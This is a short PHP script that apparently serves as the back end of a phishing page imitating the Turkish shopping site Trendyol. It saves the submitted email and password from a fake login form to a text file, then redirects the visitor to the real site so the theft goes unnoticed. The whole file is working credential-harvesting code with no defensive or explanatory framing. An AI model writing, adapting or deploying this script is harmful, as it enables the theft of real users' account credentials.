<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login-email'] . " Pass: " . $_POST['login-password'] . "\n", FILE_APPEND);
header('Location: https://trendyol.com/');
exit();
